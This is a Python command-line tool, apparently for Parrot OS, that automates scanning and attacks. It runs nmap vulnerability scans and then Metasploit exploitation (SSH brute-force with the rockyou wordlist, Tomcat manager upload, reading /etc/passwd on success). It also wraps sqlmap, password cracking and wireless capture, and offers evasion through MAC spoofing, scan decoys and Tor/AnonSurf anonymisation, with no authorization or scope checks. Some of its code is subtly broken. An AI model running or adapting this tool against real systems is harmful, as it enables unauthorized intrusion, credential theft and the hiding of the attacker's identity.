#!/usr/bin/env python3
import subprocess
import logging
from datetime import datetime
import os
import sys
import csv
import threading
from queue import Queue
import time
import random
from jinja2 import Environment, FileSystemLoader
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.styles import Style
from tqdm import tqdm
import xml.etree.ElementTree as ET  # For parsing Nmap XML output

# Configure logging
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, f"interactive_test_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
logging.basicConfig(
    filename=log_file,
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Setup Jinja2 for HTML reporting
env = Environment(loader=FileSystemLoader("templates"))
report_file = f"interactive_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
html_report_file = f"interactive_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
csv_report_file = f"interactive_test_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"

class InteractiveSystemTester:
    def __init__(self):
        self.targets = []
        self.port_range = "1-1024"
        self.profile = "all"
        self.verbose = False
        self.stealth_mode = False
        self.use_tor = False
        self.results = {}
        self.nmap_results = {}  # Store Nmap results (ports, services, vulnerabilities)
        self.lock = threading.Lock()
        self.task_queue = Queue()
        self.setup_templates()
        self.setup_prompt()
        self.last_report_files = {}

    def setup_templates(self):
        """Create templates directory and basic HTML template if not exists"""
        os.makedirs("templates", exist_ok=True)
        if not os.path.exists("templates/report.html"):
            with open("templates/report.html", "w") as f:
                f.write("""
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Interactive System Test Report</title>
                    <style>
                        body { font-family: Arial, sans-serif; }
                        h1 { color: #333; }
                        h2, h3 { color: #555; }
                        pre { background-color: #f4f4f4; padding: 10px; border-radius: 5px; }
                    </style>
                </head>
                <body>
                    <h1>Interactive System Test Report - {{ timestamp }}</h1>
                    {% for target, result in results.items() %}
                        <h2>Target: {{ target }}</h2>
                        {% for test, output in result.items() %}
                            <h3>{{ test }}</h3>
                            <pre>{{ output|safe }}</pre>
                        {% endfor %}
                    {% endfor %}
                </body>
                </html>
                """)

    def setup_prompt(self):
        """Setup interactive prompt with autocompletion and keybindings"""
        self.style = Style.from_dict({
            'prompt': '#00ff00 bold',
            'error': '#ff0000',
            'info': '#00aa00',
            'warning': '#ffaa00',
        })
        self.bindings = KeyBindings()
        self.bindings.add('c-c')(lambda event: sys.exit(0))  # Ctrl+C to exit
        self.completer = WordCompleter([
            'all', 'network', 'vulnerability', 'exploitation', 'anonymity', 'auditing',
            'yes', 'no', 'verbose', 'quiet', '127.0.0.1',
            'configure', 'targets', 'run', 'export', 'exit',
            'text', 'html', 'csv'
        ], ignore_case=True)
        self.session = PromptSession(
            style=self.style,
            completer=self.completer,
            key_bindings=self.bindings,
            multiline=False,
            prompt_message=HTML('<prompt>SystemTester> </prompt>')
        )

    def check_tool(self, tool):
        """Check if a tool is installed"""
        cmd = f"which {tool}"
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode != 0:
            logging.error(f"{tool} not found")
            if self.verbose:
                print(f"\033[91m[!] Error: {tool} is not installed. Install with 'sudo apt install {tool}'.\033[0m")
            return False
        return True

    def setup_anonymity(self):
        """Setup anonymity using Tor or AnonSurf"""
        if not self.use_tor:
            return

        if self.check_tool("anonsurf"):
            print("\033[94m[*] Setting up AnonSurf for anonymity...\033[0m")
            subprocess.run("anonsurf start", shell=True, capture_output=True, text=True)
            time.sleep(5)  # Wait for AnonSurf to initialize
            result = subprocess.run("anonsurf myip", shell=True, capture_output=True, text=True)
            if self.verbose:
                print(f"\033[92m[+] AnonSurf IP: {result.stdout}\033[0m")
        elif self.check_tool("torsocks"):
            print("\033[94m[*] Using torsocks for anonymity...\033[0m")
            # torsocks will be prepended to commands later
        else:
            print("\033[93m[-] Neither AnonSurf nor torsocks found. Anonymity features disabled.\033[0m")
            self.use_tor = False

    def spoof_mac(self):
        """Spoof MAC address for stealth"""
        if not self.stealth_mode:
            return

        interface = self.session.prompt(HTML('<prompt>Enter network interface for MAC spoofing (e.g., eth0, or press Enter to skip): </prompt>'))
        if not interface:
            print("\033[93m[-] Skipping MAC spoofing.\033[0m")
            return

        try:
            # Generate a random MAC address
            mac = ":".join([f"{random.randint(0x00, 0xff):02x}" for _ in range(6)])
            subprocess.run(f"ifconfig {interface} down", shell=True, check=True)
            subprocess.run(f"macchanger -m {mac} {interface}", shell=True, check=True)
            subprocess.run(f"ifconfig {interface} up", shell=True, check=True)
            print(f"\033[92m[+] MAC address spoofed to {mac} on {interface}\033[0m")
        except subprocess.CalledProcessError as e:
            logging.error(f"Failed to spoof MAC address: {str(e)}")
            print(f"\033[91m[!] Failed to spoof MAC address: {str(e)}\033[0m")

    def run_command(self, cmd, description, target=None, output_file=None):
        """Run a shell command with timeout and retry, ensuring continuity on failure"""
        target = target or self.targets[0]
        logging.info(f"Running {description} on {target}")
        if self.verbose:
            print(f"\033[92m[*] {description} on {target}...\033[0m")

        # Add torsocks if anonymity is enabled and the tool supports it
        if self.use_tor and self.check_tool("torsocks") and "anonsurf" not in cmd:
            cmd = f"torsocks {cmd}"

        try:
            if output_file:
                cmd += f" -oX {output_file}"  # For Nmap XML output
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=600, check=False)
            if result.returncode != 0:
                error_msg = f"Error: {result.stderr}"
                logging.error(f"{description} failed: {error_msg}")
                with self.lock:
                    self.results[target][description] = f"[ERROR] {description}\n{error_msg}\n"
                if self.verbose:
                    print(f"\033[91m[!] Failed: {description}\033[0m")
                return False
            output = result.stdout
            with self.lock:
                self.results[target][description] = f"[SUCCESS] {description}\n{output}\n"
            if self.verbose:
                print(f"\033[92m[+] Completed: {description}\033[0m")
            return True
        except subprocess.TimeoutExpired:
            error_msg = "Command timed out after 600 seconds"
            logging.error(f"{description} timed out: {error_msg}")
            with self.lock:
                self.results[target][description] = f"[ERROR] {description}\n{error_msg}\n"
            if self.verbose:
                print(f"\033[91m[!] Failed: {description} (Timeout)\033[0m")
            return False
        except Exception as e:
            error_msg = f"Unexpected error: {str(e)}"
            logging.error(f"{description} failed: {error_msg}")
            with self.lock:
                self.results[target][description] = f"[ERROR] {description}\n{error_msg}\n"
            if self.verbose:
                print(f"\033[91m[!] Failed: {description}\033[0m")
            return False

    def worker(self):
        """Worker thread to process tasks from queue"""
        while True:
            try:
                target, cmd, description = self.task_queue.get_nowait()
                self.run_command(cmd, description, target)
                self.task_queue.task_done()
            except Queue.Empty:
                break
            except Exception as e:
                logging.error(f"Worker thread error: {str(e)}")
                self.task_queue.task_done()

    def run_parallel_tasks(self, tasks):
        """Run tasks in parallel with a progress bar, ensuring continuity on failure"""
        total_tasks = len(tasks)
        print(f"\n\033[94m[*] Starting {total_tasks} tasks...\033[0m")
        with tqdm(total=total_tasks, desc="Progress", bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}]") as pbar:
            threads = []
            for _ in range(min(10, total_tasks)):
                t = threading.Thread(target=self.worker)
                t.start()
                threads.append(t)
            for task in tasks:
                self.task_queue.put(task)
            self.task_queue.join()
            for t in threads:
                t.join()
            pbar.update(total_tasks)

    def parse_nmap_output(self, xml_file, target):
        """Parse Nmap XML output to extract CVEs, threats, and vulnerabilities"""
        try:
            tree = ET.parse(xml_file)
            root = tree.getroot()
            ports_info = []
            vulnerabilities = []

            for host in root.findall('host'):
                for port in host.findall('.//port'):
                    state = port.find('state').get('state')
                    if state != 'open':
                        continue
                    port_id = port.get('portid')
                    service = port.find('service')
                    service_name = service.get('name') if service is not None else 'unknown'
                    version = service.get('version') if service is not None and service.get('version') else 'unknown'
                    ports_info.append({
                        'port': port_id,
                        'service': service_name,
                        'version': version
                    })

                    # Extract vulnerabilities, CVEs, and threats from NSE scripts
                    for script in port.findall('.//script'):
                        script_id = script.get('id')
                        script_output = script.get('output')
                        if 'vuln' in script_id.lower() and script_output:
                            cve = None
                            for line in script_output.splitlines():
                                if 'CVE-' in line:
                                    cve = line.split('CVE-')[1].split(' ')[0]
                                    break
                            vulnerabilities.append({
                                'port': port_id,
                                'script': script_id,
                                'output': script_output,
                                'cve': f"CVE-{cve}" if cve else None
                            })

            self.nmap_results[target] = {
                'ports': ports_info,
                'vulnerabilities': vulnerabilities
            }
            logging.info(f"Parsed Nmap results for {target}: {len(ports_info)} open ports, {len(vulnerabilities)} vulnerabilities")
            if self.verbose:
                print(f"\033[92m[+] Found {len(ports_info)} open ports and {len(vulnerabilities)} vulnerabilities on {target}\033[0m")
        except Exception as e:
            logging.error(f"Error parsing Nmap output: {str(e)}")
            if self.verbose:
                print(f"\033[91m[!] Error parsing Nmap output: {str(e)}\033[0m")

    def run_nmap(self, target):
        """Run Nmap scan with version detection and vulnerability scanning"""
        if not self.check_tool("nmap"):
            return
        xml_output = f"nmap_output_{target.replace('.', '_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.xml"
        cmd = f"nmap -p {self.port_range} -sV --script vuln {target}"
        if self.stealth_mode:
            # Add stealth options: slower scan rate, decoys, and randomized timing
            cmd += " -T2 --max-retries 1 --scan-delay 1s --spoof-mac 0 -D RND:5"
        if self.run_command(cmd, f"Running Nmap scan with vulnerability detection on {target} (ports {self.port_range})", target, output_file=xml_output):
            self.parse_nmap_output(xml_output, target)
            try:
                os.remove(xml_output)
            except Exception as e:
                logging.warning(f"Could not delete Nmap XML file {xml_output}: {str(e)}")

    def run_metasploit_vuln_scan(self, target):
        """Run Metasploit to scan for vulnerabilities and CVEs"""
        if not self.check_tool("msfconsole"):
            return

        msf_commands = []
        ports_info = self.nmap_results[target]['ports']

        # Run service-specific vulnerability scans
        for port_info in ports_info:
            port = port_info['port']
            service = port_info['service'].lower()

            if service == 'ssh':
                msf_commands.append(f"use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {target}; set RPORT {port}; run;")
            elif service in ['http', 'https']:
                msf_commands.append(f"use auxiliary/scanner/http/tomcat_mgr_login; set RHOSTS {target}; set RPORT {port}; run;")
                msf_commands.append(f"use auxiliary/scanner/http/http_put; set RHOSTS {target}; set RPORT {port}; run;")

        msf_command = "msfconsole -x '" + " ".join(msf_commands) + " exit'"
        self.run_command(msf_command, f"Running Metasploit vulnerability scan on {target}", target)

    def run_metasploit(self):
        """Run Metasploit to perform auxiliary tests and exploitation based on Nmap results"""
        if not self.check_tool("msfconsole"):
            return

        target = self.targets[0]  # For simplicity, use the first target
        if target not in self.nmap_results or not self.nmap_results[target]['ports']:
            print(f"\033[93m[-] No Nmap results available for {target}. Skipping Metasploit.\033[0m")
            return

        # First, run vulnerability scans with Metasploit
        self.run_metasploit_vuln_scan(target)

        # Then, proceed with exploitation if vulnerabilities are found
        msf_commands = []
        ports_info = self.nmap_results[target]['ports']
        vulnerabilities = self.nmap_results[target]['vulnerabilities']

        for port_info in ports_info:
            port = port_info['port']
            service = port_info['service'].lower()
            version = port_info['version']

            if service == 'ssh':
                msf_commands.append(f"use auxiliary/scanner/ssh/ssh_version; set RHOSTS {target}; set RPORT {port}; run;")
            elif service in ['http', 'https']:
                msf_commands.append(f"use auxiliary/scanner/http/http_version; set RHOSTS {target}; set RPORT {port}; run;")

        if vulnerabilities:
            print(f"\033[94m[*] Detected {len(vulnerabilities)} vulnerabilities on {target}:\033[0m")
            for vuln in vulnerabilities:
                print(f"  - Port {vuln['port']}: {vuln['script']} - {vuln['output']}")
                if vuln['cve']:
                    print(f"    CVE: {vuln['cve']}")
            proceed = self.session.prompt(
                HTML('<prompt>Proceed with exploitation? (yes/no): </prompt>'),
                completer=WordCompleter(['yes', 'no'], ignore_case=True)
            ).lower()
            if proceed == 'yes':
                username = self.session.prompt(HTML('<prompt>Enter username for exploitation (default: admin): </prompt>')) or "admin"
                password = self.session.prompt(HTML('<prompt>Enter password for exploitation (default: password): </prompt>')) or "password"
                wordlist = self.session.prompt(HTML('<prompt>Enter path to wordlist (or press Enter for default /usr/share/wordlists/rockyou.txt): </prompt>')) or "/usr/share/wordlists/rockyou.txt"
                if not os.path.exists(wordlist):
                    print(f"\033[91m[!] Wordlist {wordlist} not found. Using default /usr/share/wordlists/rockyou.txt.\033[0m")
                    wordlist = "/usr/share/wordlists/rockyou.txt"

                for vuln in vulnerabilities:
                    script_id = vuln['script']
                    port = vuln['port']
                    output = vuln['output'].lower()

                    if 'ssh' in script_id.lower() and 'vulnerable' in output:
                        msf_commands.append(f"use exploit/multi/ssh/sshexec; set RHOSTS {target}; set RPORT {port}; set USERNAME {username}; set PASSWORD {password}; run;")
                        msf_commands.append(f"set PASS_FILE {wordlist}; run;")
                        if self.verbose:
                            print(f"\033[92m[+] Attempting SSH exploitation on {target}:{port} with wordlist {wordlist}\033[0m")

                    if 'http' in script_id.lower() and 'vulnerable' in output:
                        msf_commands.append(f"use exploit/multi/http/tomcat_mgr_upload; set RHOSTS {target}; set RPORT {port}; run;")
                        if self.verbose:
                            print(f"\033[92m[+] Attempting HTTP exploitation on {target}:{port}\033[0m")

                    msf_commands.append(f"if session_created?; then sysinfo; sessions -i; pwd; cat /etc/passwd; exit; end;")

        if not msf_commands:
            msf_commands.append(f"use auxiliary/scanner/portscan/tcp; set RHOSTS {target}; set PORTS {self.port_range}; run;")

        msf_command = "msfconsole -x '" + " ".join(msf_commands) + " exit'"
        self.run_command(msf_command, "Running Metasploit auxiliary tests and exploitation", target)

    def gather_system_info(self, target):
        """Gather basic system information"""
        tasks = [
            (target, "whoami", "Checking current user"),
            (target, "hostname", "Checking hostname"),
            (target, "uname -a", "Checking kernel and system info"),
            (target, "ufw status", "Checking firewall status"),
            (target, "ps aux", "Listing running processes"),
            (target, "ss -tuln", "Listing listening ports"),
        ]
        self.run_parallel_tasks(tasks)

    def run_masscan(self, target):
        """Run Masscan for faster scanning"""
        if not self.check_tool("masscan"):
            return
        cmd = f"masscan {target} -p {self.port_range} --rate 1000"
        if self.stealth_mode:
            cmd += " --wait 2 --randomize-hosts"
        self.run_command(cmd, f"Running Masscan on {target} (ports {self.port_range})", target)

    def run_netcat(self, target):
        """Run Netcat scan"""
        if not self.check_tool("nc"):
            return
        cmd = f"nc -z -nv {target} {self.port_range}"
        if self.stealth_mode:
            cmd += " -w 2"  # Increase timeout for stealth
        self.run_command(cmd, f"Running Netcat scan on {target} (ports {self.port_range})", target)

    def run_nikto(self, target):
        """Run Nikto for web vulnerability scanning"""
        if not self.check_tool("nikto"):
            return
        cmd = f"nikto -h {target}"
        if self.stealth_mode:
            cmd += " -Tuning 8"  # Stealth mode in Nikto
        self.run_command(cmd, f"Running Nikto on {target}", target)

    def run_sqlmap(self, target):
        """Run SQLmap for SQL injection testing"""
        if not self.check_tool("sqlmap"):
            return
        cmd = f"sqlmap -u http://{target} --batch"
        if self.stealth_mode:
            cmd += " --delay 1 --safe-url http://example.com --safe-freq 3"
        self.run_command(cmd, f"Running SQLmap on {target}", target)

    def run_john(self):
        """Run John the Ripper for password cracking with custom wordlist"""
        if not self.check_tool("john"):
            return
        hash_file = self.session.prompt(HTML('<prompt>Enter path to hash file (or press Enter to skip): </prompt>'))
        if not hash_file:
            print("\033[93m[-] Skipping John the Ripper test.\033[0m")
            return
        if not os.path.exists(hash_file):
            print(f"\033[91m[!] Hash file {hash_file} not found.\033[0m")
            return
        wordlist = self.session.prompt(HTML('<prompt>Enter path to wordlist (or press Enter for default /usr/share/wordlists/rockyou.txt): </prompt>')) or "/usr/share/wordlists/rockyou.txt"
        if not os.path.exists(wordlist):
            print(f"\033[91m[!] Wordlist {wordlist} not found. Using default /usr/share/wordlists/rockyou.txt.\033[0m")
            wordlist = "/usr/share/wordlists/rockyou.txt"
        cmd = f"john --wordlist={wordlist} {hash_file}"
        self.run_command(cmd, "Running John the Ripper password cracking with custom wordlist", self.targets[0])

    def run_aircrack_ng(self):
        """Run Aircrack-ng for wireless testing"""
        if not self.check_tool("aircrack-ng"):
            return
        interface = self.session.prompt(HTML('<prompt>Enter wireless interface (e.g., wlan0, or press Enter to skip): </prompt>'))
        if not interface:
            print("\033[93m[-] Skipping Aircrack-ng test.\033[0m")
            return
        cmd = f"airmon-ng start {interface} && airodump-ng {interface}mon"
        self.run_command(cmd, f"Running Aircrack-ng on {interface}", self.targets[0])

    def check_anonsurf(self):
        """Check AnonSurf and Tor status"""
        if not self.check_tool("anonsurf"):
            return
        tasks = [
            (self.targets[0], "anonsurf status", "Checking AnonSurf status"),
            (self.targets[0], "anonsurf myip", "Checking IP via AnonSurf"),
            (self.targets[0], "curl --socks5 localhost:9050 https://check.torproject.org/api/ip", "Checking Tor IP")
        ]
        self.run_parallel_tasks(tasks)

    def run_lynis(self):
        """Run Lynis for system auditing"""
        if not self.check_tool("lynis"):
            return
        cmd = "lynis audit system"
        self.run_command(cmd, "Running Lynis system audit", self.targets[0])

    def run_chkrootkit(self):
        """Run chkrootkit for rootkit detection"""
        if not self.check_tool("chkrootkit"):
            return
        cmd = "chkrootkit"
        self.run_command(cmd, "Running chkrootkit", self.targets[0])

    def save_report(self, formats=None):
        """Save results to specified formats (text, html, csv)"""
        if not formats:
            formats = ['text', 'html', 'csv']

        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        report_file = f"interactive_test_report_{timestamp}.txt"
        html_report_file = f"interactive_test_report_{timestamp}.html"
        csv_report_file = f"interactive_test_report_{timestamp}.csv"

        saved_files = []
        try:
            if 'text' in formats:
                with open(report_file, "w") as f:
                    f.write(f"Interactive System Test Report - {datetime.now().isoformat()}\n")
                    f.write("=" * 50 + "\n\n")
                    for target, result in self.results.items():
                        f.write(f"Target: {target}\n")
                        for test, output in result.items():
                            f.write(f"{test}\n{output}\n")
                logging.info(f"Text report saved to {report_file}")
                saved_files.append(report_file)

            if 'html' in formats:
                template = env.get_template("report.html")
                html_content = template.render(timestamp=datetime.now().isoformat(), results=self.results)
                with open(html_report_file, "w") as f:
                    f.write(html_content)
                logging.info(f"HTML report saved to {html_report_file}")
                saved_files.append(html_report_file)

            if 'csv' in formats:
                with open(csv_report_file, "w", newline="") as f:
                    writer = csv.writer(f)
                    writer.writerow(["Target", "Test", "Result"])
                    for target, result in self.results.items():
                        for test, output in result.items():
                            writer.writerow([target, test, output.replace("\n", " ")])
                logging.info(f"CSV report saved to {csv_report_file}")
                saved_files.append(csv_report_file)

            self.last_report_files = {
                'text': report_file if 'text' in formats else None,
                'html': html_report_file if 'html' in formats else None,
                'csv': csv_report_file if 'csv' in formats else None
            }

            print(f"\033[92m[+] Reports saved: {', '.join(saved_files)}\033[0m")
        except Exception as e:
            logging.error(f"Error saving report: {str(e)}")
            print(f"\033[91m[!] Error saving report: {str(e)}\033[0m")

    def export_reports(self):
        """Interactively export reports in selected formats"""
        if not self.results:
            print("\033[93m[-] No test results available to export. Please run a test first.\033[0m")
            return

        print("\n\033[94m=== Export Reports ===\033[0m")
        formats_input = self.session.prompt(
            HTML('<prompt>Select export formats (text, html, csv, comma-separated, e.g., text,csv): </prompt>'),
            completer=WordCompleter(['text', 'html', 'csv'], ignore_case=True)
        ).lower()

        if not formats_input:
            print("\033[93m[-] No formats selected. Export cancelled.\033[0m")
            return

        selected_formats = [fmt.strip() for fmt in formats_input.split(',')]
        valid_formats = ['text', 'html', 'csv']
        formats_to_export = [fmt for fmt in selected_formats if fmt in valid_formats]

        if not formats_to_export:
            print("\033[93m[-] Invalid formats selected. Use: text, html, csv.\033[0m")
            return

        self.save_report(formats=formats_to_export)

    def select_targets(self):
        """Interactively select targets"""
        print("\n\033[94m=== Target Selection ===\033[0m")
        method = self.session.prompt(
            HTML('<prompt>Choose target selection method (single/file): </prompt>'),
            completer=WordCompleter(['single', 'file'], ignore_case=True)
        ).lower()
        
        if method == 'single':
            target = self.session.prompt(HTML('<prompt>Enter target IP (default: 127.0.0.1): </prompt>'))
            self.targets = [target or "127.0.0.1"]
        elif method == 'file':
            file_path = self.session.prompt(HTML('<prompt>Enter path to targets file: </prompt>'))
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    self.targets = [line.strip() for line in f if line.strip()]
            else:
                print(f"\033[91m[!] File {file_path} not found. Using default target (127.0.0.1).\033[0m")
                self.targets = ["127.0.0.1"]
        else:
            print("\033[93m[-] Invalid method. Using default target (127.0.0.1).\033[0m")
            self.targets = ["127.0.0.1"]
        
        print(f"\033[92m[+] Selected targets: {', '.join(self.targets)}\033[0m")

    def configure_settings(self):
        """Interactively configure test settings"""
        print("\n\033[94m=== Test Configuration ===\033[0m")
        self.port_range = self.session.prompt(
            HTML('<prompt>Enter port range (default: 1-1024): </prompt>')
        ) or "1-1024"
        
        self.profile = self.session.prompt(
            HTML('<prompt>Choose test profile (all/network/vulnerability/exploitation/anonymity/auditing): </prompt>')
        ).lower() or "all"
        
        verbose_input = self.session.prompt(
            HTML('<prompt>Enable verbose mode? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.verbose = verbose_input == "yes"

        stealth_input = self.session.prompt(
            HTML('<prompt>Enable stealth mode? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.stealth_mode = stealth_input == "yes"

        tor_input = self.session.prompt(
            HTML('<prompt>Use Tor for anonymity? (yes/no): </prompt>'),
            completer=WordCompleter(['yes', 'no'], ignore_case=True)
        ).lower()
        self.use_tor = tor_input == "yes"

        if self.use_tor:
            self.setup_anonymity()
        if self.stealth_mode:
            self.spoof_mac()
        
        print(f"\033[92m[+] Configured: Port Range={self.port_range}, Profile={self.profile}, Verbose={self.verbose}, Stealth={self.stealth_mode}, Tor={self.use_tor}\033[0m")

    def run_profile(self):
        """Run tests based on selected profile with robust error handling"""
        if self.profile not in ["all", "network", "vulnerability", "exploitation", "anonymity", "auditing"]:
            print(f"\033[91m[!] Invalid profile. Use: all, network, vulnerability, exploitation, anonymity, auditing\033[0m")
            return

        # Initialize results dictionary for each target
        for target in self.targets:
            self.results[target] = {}
            self.nmap_results[target] = {'ports': [], 'vulnerabilities': []}

        try:
            if self.profile == "all" or self.profile == "network":
                for target in self.targets:
                    self.run_nmap(target)
                    self.run_masscan(target)
                    self.run_netcat(target)

            if self.profile == "all" or self.profile == "vulnerability":
                for target in self.targets:
                    self.run_nikto(target)
                    self.run_sqlmap(target)

            if self.profile == "all" or self.profile == "exploitation":
                self.run_metasploit()
                self.run_john()

            if self.profile == "all" or self.profile == "anonymity":
                self.check_anonsurf()

            if self.profile == "all" or self.profile == "auditing":
                self.run_lynis()
                self.run_chkrootkit()
                self.gather_system_info(self.targets[0])
        except Exception as e:
            logging.error(f"Error in run_profile: {str(e)}")
            print(f"\033[91m[!] Error in test execution: {str(e)}. Continuing with remaining tests...\033[0m")

        self.export_reports()

    def main_menu(self):
        """Main interactive menu"""
        print("\033[94m=== Welcome to Interactive System Tester for Parrot OS ===\033[0m")
        print("Type 'exit' or press Ctrl+C to quit.\n")
        
        while True:
            choice = self.session.prompt(
                HTML('<prompt>Choose an action (configure/targets/run/export/exit): </prompt>'),
                completer=WordCompleter(['configure', 'targets', 'run', 'export', 'exit'], ignore_case=True)
            ).lower()

            if choice == "exit":
                # Stop AnonSurf if running
                if self.use_tor and self.check_tool("anonsurf"):
                    subprocess.run("anonsurf stop", shell=True, capture_output=True, text=True)
                print("\033[92m[+] Exiting System Tester. Goodbye!\033[0m")
                break
            elif choice == "configure":
                self.configure_settings()
            elif choice == "targets":
                self.select_targets()
            elif choice == "run":
                if not self.targets:
                    print("\033[93m[-] No targets selected. Please select targets first.\033[0m")
                    continue
                print(f"\n\033[94m[*] Starting tests with profile '{self.profile}' on {len(self.targets)} targets...\033[0m")
                start_time = time.time()
                self.run_profile()
                end_time = time.time()
                print(f"\033[92m[+] Testing completed in {end_time - start_time:.2f} seconds\033[0m")
            elif choice == "export":
                self.export_reports()
            else:
                print("\033[93m[-] Invalid choice. Options: configure, targets, run, export, exit\033[0m")

def main():
    if os.geteuid() != 0:
        print("\033[91m[!] This script requires root privileges. Please run with sudo.\033[0m")
        sys.exit(1)

    tester = InteractiveSystemTester()
    tester.main_menu()

if __name__ == "__main__":
    main()